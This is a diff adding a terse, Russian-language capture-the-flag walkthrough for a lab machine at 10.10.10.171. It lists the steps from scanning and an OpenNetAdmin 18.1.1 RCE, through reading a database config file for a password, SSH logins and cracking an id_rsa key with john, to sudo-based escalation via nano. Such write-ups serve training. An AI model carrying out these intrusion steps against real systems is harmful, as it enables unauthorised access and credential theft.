@@ -1,0 +1,16 @@
+1- nmap
+2- использовать 'dirsearch'
+3- перейти к '/ ona /'
+4- использовать OpenNetAdmin 18.1.1 - RCE
+5- cat /opt/ona/www/local/config/database_settings.inc.php
+6- получить пароль
+7- ssh jimmy@10.10.10.171 используйте пароль
+8- netstat -nulpt
+9- curl http://127.0.0.1:52846/main.php
+10- взломать id_rsa, используя 'john'
+11- ssh -i id_rsa joanna@10.10.10.171
+12- cat user.txt
+13- 'sudo -l' и использовать 'nano'
+14- получить файл root.txt
+
+MR.Dark_Smile :)
